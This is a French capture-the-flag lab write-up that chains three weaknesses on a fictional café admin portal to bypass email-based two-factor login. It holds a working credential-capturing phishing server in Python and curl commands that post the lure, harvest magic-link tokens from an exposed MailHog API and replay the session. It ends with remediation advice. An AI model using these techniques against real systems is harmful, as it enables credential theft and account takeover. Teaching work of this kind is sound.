# Portail Admin — Phishing & Contournement 2FA (Chaîne complète)

**Catégorie :** Web - Phishing / Social Engineering
**Difficulté :** Avancée
**Points :** proposer 450-500 (chaîne la plus longue du lab)

## Scénario

Le portail d'administration du Café Saffran protège l'accès admin avec une authentification en deux étapes : mot de passe, puis un "lien magique" envoyé par email pour confirmer la connexion. Une employée (Fatma) consulte régulièrement un tableau d'annonces internes. Ce tableau accepte des publications sans authentification, et le serveur de messagerie interne (MailHog) n'a aucune protection sur son interface web. L'objectif est d'enchaîner ces trois faiblesses pour obtenir un accès complet au dashboard admin, sans jamais connaître le mot de passe de Fatma au départ.

## Vulnérabilités en jeu

1. **Absence d'authentification sur le tableau d'annonces** (`/annonces`) — n'importe qui peut y publier un contenu, y compris un lien malveillant, sans vérification ni modération.
2. **Confiance implicite d'un processus automatisé** — le bot qui simule Fatma visite systématiquement le dernier lien publié et soumet ses identifiants sur toute page ressemblant au formulaire de connexion, sans vérifier le domaine réel.
3. **Service de messagerie interne non protégé** — l'interface web de MailHog (port 8025) est accessible sans authentification, alors qu'elle n'est censée être consultée que par les utilisateurs légitimes recevant leurs propres emails.

Aucune de ces trois faiblesses n'est critique isolément — c'est leur **combinaison** qui permet la prise de compte complète : c'est la logique d'une vraie chaîne d'attaque en pentest d'infrastructure.

## Exploitation, étape par étape

### Étape 1 — Héberger une page de phishing

Un petit serveur HTTP Python, reproduisant exactement les champs du vrai formulaire de connexion (`username`, `password`), capture toute soumission dans un fichier local :

```python
class Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        data = parse_qs(self.rfile.read(length).decode())
        with open("captured_creds.txt", "a") as f:
            f.write(f"{datetime.datetime.now()} - {data}\n")
```

Ce serveur doit tourner sur une machine **joignable par le bot** — dans ce lab, le conteneur `kali_attacker` (sur le même réseau Docker que la cible), pas une VM externe isolée sur un autre segment réseau.

### Étape 2 — Publier le lien de phishing sur le tableau d'annonces

```bash
curl -X POST http://<cible>:5007/annonces \
  --data-urlencode "titre=Mise à jour de sécurité obligatoire" \
  --data-urlencode "url=http://<attaquant>:8081/"
```

Aucune authentification requise pour cette publication — c'est la première faille exploitée.

### Étape 3 — Attendre le passage du bot (employée simulée)

Le bot (navigateur headless Playwright) visite périodiquement la dernière annonce publiée, détecte un formulaire de connexion sur la page, et soumet les identifiants de Fatma — pensant être sur le vrai portail, car rien ne vérifie le domaine de destination avant de soumettre les identifiants.

### Étape 4 — Récupérer les identifiants volés

```bash
cat captured_creds.txt
# {'username': ['fatma'], 'password': ['CoffeeLove2026!']}
```

### Étape 5 — Se connecter sur le VRAI portail avec les identifiants volés

```bash
curl -X POST http://<cible>:5007/login \
  --data-urlencode "username=fatma" \
  --data-urlencode "password=CoffeeLove2026!"
```

Cette connexion réussie déclenche l'envoi automatique d'un email contenant le lien magique de confirmation, vers l'adresse `fatma@cafesaffran.local`.

### Étape 6 — Lire l'email dans MailHog (deuxième faille)

L'interface web de MailHog n'exige aucune authentification pour consulter **tous** les emails passés par le serveur, pas seulement ceux de l'utilisateur courant :

```bash
curl -s http://<cible>:8025/api/v2/messages | grep -o "http://cafe_admin_portal:5007/verify/[a-f0-9-]*"
```

### Étape 7 — Utiliser le lien magique pour obtenir le cookie de session

```bash
curl -c cookies.txt http://cafe_admin_portal:5007/verify/<token>
```

Le token est à usage unique — une fois consommé, il devient invalide (`Lien invalide ou déjà utilisé`), ce qui est le comportement normal attendu d'un mécanisme de lien magique bien implémenté.

### Étape 8 — Accéder au dashboard admin

```bash
curl -H "Cookie: session_user=fatma" http://cafe_admin_portal:5007/admin/dashboard
```

Note pratique : le fichier de cookies Netscape généré par `curl -c` a échoué à être réutilisé correctement avec `-b` sur ce host (probablement un souci de parsing du domaine par curl avec un nom DNS Docker interne sans TLD). Passer l'en-tête `Cookie:` manuellement a contourné le problème.

## Point pédagogique

Ce challenge illustre une leçon centrale du pentest moderne : **la 2FA par email ne protège que si le canal email lui-même est sécurisé.** Ici, le facteur "quelque chose que vous possédez" (l'accès à la boîte mail) est cassé, car le service de messagerie est exposé sans contrôle d'accès — rendant la seconde étape d'authentification complètement inutile.

Cela illustre aussi pourquoi le phishing reste un vecteur d'attaque dominant en entreprise : la faille technique initiale (tableau d'annonces non authentifié) est mineure en soi, mais elle devient le point d'entrée d'une chaîne complète grâce à la confiance humaine (ou, ici, automatisée) placée dans un lien qui semble légitime.

## Remédiation

- **Authentifier et modérer** toute publication sur un canal consulté par des utilisateurs internes, même "informel" (tableau d'annonces, wiki, etc.).
- **Sensibilisation/formation anti-phishing** — vérifier l'URL réelle avant de soumettre des identifiants, ne jamais faire confiance à un lien sans vérifier le domaine.
- **Protéger l'accès aux services de messagerie internes** avec une authentification stricte, même pour des outils de test/dev comme MailHog — ne jamais les exposer sans contrôle d'accès, y compris en interne.
- **Lier le lien magique à des éléments contextuels supplémentaires** (adresse IP d'origine, user-agent, fenêtre de temps courte) pour réduire la fenêtre d'exploitation même si l'email est intercepté.
- **Privilégier une 2FA par application d'authentification (TOTP)** plutôt que par email quand c'est possible — un canal email compromis ne doit pas suffire à casser toute la chaîne d'authentification.
